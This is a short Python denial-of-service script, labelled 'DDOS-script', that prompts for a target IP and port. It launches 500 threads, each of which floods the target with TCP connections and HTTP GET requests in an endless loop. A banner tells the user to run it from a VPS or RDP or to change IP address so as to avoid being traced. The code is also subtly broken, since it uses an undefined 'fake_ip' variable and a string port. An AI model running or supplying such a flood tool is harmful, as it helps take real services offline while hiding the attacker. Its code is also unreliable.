import socket
import threading
import time


#ta7ya l toilet
print('''
 ____  ____   ___  ____                      _       _     _           
|  _ \|  _ \ / _ \/ ___|       ___  ___ _ __(_)_ __ | |_  | |__  _   _ 
| | | | | | | | | \___ \ _____/ __|/ __| '__| | '_ \| __| | '_ \| | | |
| |_| | |_| | |_| |___) |_____\__ \ (__| |  | | |_) | |_  | |_) | |_| |
|____/|____/ \___/|____/      |___/\___|_|  |_| .__/ \__| |_.__/ \__, |
                                              |_|                |___/ 
__     __      __  __ _  _   _  ___  _   ____   _____     __
\ \   / /     |  \/  | || | | |/ / || | |  _ \ / _ \ \   / /
 \ \ / / ____ | |\/| | || |_| ' /| || |_| |_) | | | \ \ / / 
  \ V / |____|| |  | |__   _| . \|__   _|  _ <| |_| |\ V /  
   \_/        |_|  |_|  |_| |_|\_\  |_| |_| \_\\___/  \_/                                                    
''')


print('''
|-------------------------ATTENTION------------------------------|
|    1!= you'd better run this script on VPS or RDP              |
|    2!= if u dont have one of them u should change your IP-add  |
|----------------------------------------------------------------|
''')

#============target info================#
zombie_IP = input("Enter your target IP : ")
zombie_PORT = input("Enter the port : ")


#============Attack func================#
def attack():
    #infinity stones
    while True:
        catapulta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        catapulta.connect((zombie_IP, zombie_PORT))
        catapulta.sendto(("GET /" + zombie_IP + " HTTP/1.1\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
        catapulta.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
        catapulta.close()

#============number of threads==========#
for i in range(500):
    N_0F_7 = threading.Thread(target=attack)
    N_0F_7.start()